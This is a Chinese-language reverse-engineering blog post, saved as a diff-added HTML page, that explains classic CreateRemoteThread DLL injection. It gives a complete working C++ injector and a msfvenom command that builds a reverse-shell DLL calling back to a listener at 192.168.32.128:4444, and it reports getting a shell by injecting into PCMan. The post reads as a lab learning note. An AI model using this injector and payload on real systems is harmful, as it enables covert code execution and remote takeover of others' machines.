@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>CreateRemoteThread dll injection | tenghaooo&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="經典dll injection，使用幾個WinAPI的組合  OpenProcess取得remote process HANDLE VirtualAllocEx在remote process上申請空間 WriteProcessMemory寫入要注入的dll路徑 GetProcAddress取得LoadLibraryW的地址，這步要確認一下當前的kernel32.dll載入到當前(dll injec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CreateRemoteThread dll injection">
+<meta property="og:url" content="https://tenghaooo.github.io/2022/05/10/RE-dll-injection/index.html">
+<meta property="og:site_name" content="tenghaooo&#39;s blog">
+<meta property="og:description" content="經典dll injection，使用幾個WinAPI的組合  OpenProcess取得remote process HANDLE VirtualAllocEx在remote process上申請空間 WriteProcessMemory寫入要注入的dll路徑 GetProcAddress取得LoadLibraryW的地址，這步要確認一下當前的kernel32.dll載入到當前(dll injec">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tenghaooo.github.io/pics/kernel32.JPG">
+<meta property="og:image" content="https://tenghaooo.github.io/pics/PCMan.JPG">
+<meta property="og:image" content="https://tenghaooo.github.io/pics/rshell.JPG">
+<meta property="article:published_time" content="2022-05-10T12:00:00.000Z">
+<meta property="article:modified_time" content="2022-05-10T12:43:20.584Z">
+<meta property="article:author" content="tenghaooo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tenghaooo.github.io/pics/kernel32.JPG">
+  
+    <link rel="alternate" href="/atom.xml" title="tenghaooo's blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">tenghaooo&#39;s blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/whoami">Whoami</a>
+        
+          <a class="main-nav-link" href="/works">Works</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://tenghaooo.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-RE-dll-injection" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/05/10/RE-dll-injection/" class="article-date">
+  <time class="dt-published" datetime="2022-05-10T12:00:00.000Z" itemprop="datePublished">2022-05-10</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">逆向工程</a>►<a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/Hooking-Injection/">Hooking & Injection</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      CreateRemoteThread dll injection
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>經典dll injection，使用幾個WinAPI的組合</p>
+<ul>
+<li>OpenProcess取得remote process HANDLE</li>
+<li>VirtualAllocEx在remote process上申請空間</li>
+<li>WriteProcessMemory寫入要注入的dll路徑</li>
+<li>GetProcAddress取得LoadLibraryW的地址，這步要確認一下當前的kernel32.dll載入到當前(dll injector.exe)的process跟載入到remote process的virtual address是不是相同，必須要相同，否則當前process的LoadLibraryW的address就不會是remote process中LoadLibraryW的address</li>
+<li>CreateRemoteThread讓remote process新建thread去執行LoadLibraryW注入dll</li>
+</ul>
+<span id="more"></span>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	<span class="keyword">wchar_t</span> dllPath[] = <span class="built_in">TEXT</span>(<span class="string">&quot;D:\\test\\rshell.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Injecting DLL to PID: %i\n&quot;</span>, <span class="built_in">atoi</span>(argv[<span class="number">1</span>]));</span><br><span class="line">	processHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="built_in">DWORD</span>(<span class="built_in">atoi</span>(argv[<span class="number">1</span>])));</span><br><span class="line">	remoteBuffer = <span class="built_in">VirtualAllocEx</span>(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> dllPath, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(processHandle, remoteBuffer, (LPVOID)dllPath, <span class="keyword">sizeof</span> dllPath, <span class="literal">NULL</span>);</span><br><span class="line">	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">	<span class="built_in">CreateRemoteThread</span>(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, threatStartRoutineAddress, remoteBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(processHandle);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用msfvenom製作dll，放到D:\test\下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.32.128 LPORT=4444 -f dll &gt; rshell.dll</span><br></pre></td></tr></table></figure>
+
+<p>如果要注入的remote process是32bit的，那就製作32bit的dll，injector也編譯成x86<br>如果要注入的remote process是64bit，那就用64bit的dll，injector也編譯成x64</p>
+<p>可以看到32bit process的kernel32的address和其路徑<code>C:\Windows\SysWOW64\kernel32.dll</code><br><img src="https://tenghaooo.github.io/pics/kernel32.JPG" alt="32-bit kernel32"></p>
+<p>如果injector編譯成x86，也會是這個address和路徑<br>但如果是x64，會變成<code>C:\Windows\System32\kernel32.dll</code></p>
+<p>注入成功後，可以看到PCMan有載入rshell.dll，而且有spawn出cmd<br><img src="https://tenghaooo.github.io/pics/PCMan.JPG" alt="注入PCMan"></p>
+<p>並且成功獲取shell<br><img src="https://tenghaooo.github.io/pics/rshell.JPG" alt="rshell"></p>
+<p>參考資料<br><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection</a><br><a target="_blank" rel="noopener" href="https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks">https://www.apriorit.com/dev-blog/679-windows-dll-injection-for-api-hooks</a><br><a target="_blank" rel="noopener" href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process">https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tenghaooo.github.io/2022/05/10/RE-dll-injection/" data-id="cl30591ih0007x8tv8xil51sx" data-title="CreateRemoteThread dll injection" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/05/02/RE-inline-hooking/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">API Inline Hooking</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%80%E6%9B%B8%E7%AD%86%E8%A8%98/">讀書筆記</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%80%E6%9B%B8%E7%AD%86%E8%A8%98/Malware/">Malware</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%80%E6%9B%B8%E7%AD%86%E8%A8%98/Malware/Windows-APT-Warfare%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%B7%9A%E6%88%B0%E8%A1%93%E6%8C%87%E5%8D%97/">Windows APT Warfare惡意程式前線戰術指南</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%80%E6%9B%B8%E7%AD%86%E8%A8%98/Operating-System/">Operating System</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%80%E6%9B%B8%E7%AD%86%E8%A8%98/Operating-System/Operating-Systems-Three-Easy-Pieces/">Operating Systems: Three Easy Pieces</a></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">逆向工程</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/Hooking-Injection/">Hooking & Injection</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AD%98/">零碎知識</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/05/10/RE-dll-injection/">CreateRemoteThread dll injection</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/02/RE-inline-hooking/">API Inline Hooking</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/10/APTWarfare-ch3-TEB%20&%20PEB/">ch.3 TEB &amp; PEB</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/09/Other-fd/">file descriptor</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/24/OSTEP-ch18-paging/">ch.18 paging</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/PEB/" style="font-size: 10px;">PEB</a> <a href="/tags/TEB/" style="font-size: 10px;">TEB</a> <a href="/tags/calling-convention/" style="font-size: 10px;">calling convention</a> <a href="/tags/fd/" style="font-size: 10px;">fd</a> <a href="/tags/process-hollowing/" style="font-size: 10px;">process hollowing</a> <a href="/tags/process-injection/" style="font-size: 10px;">process injection</a> <a href="/tags/runpe/" style="font-size: 10px;">runpe</a>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 tenghaooo<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/whoami" class="mobile-nav-link">Whoami</a>
+  
+    <a href="/works" class="mobile-nav-link">Works</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
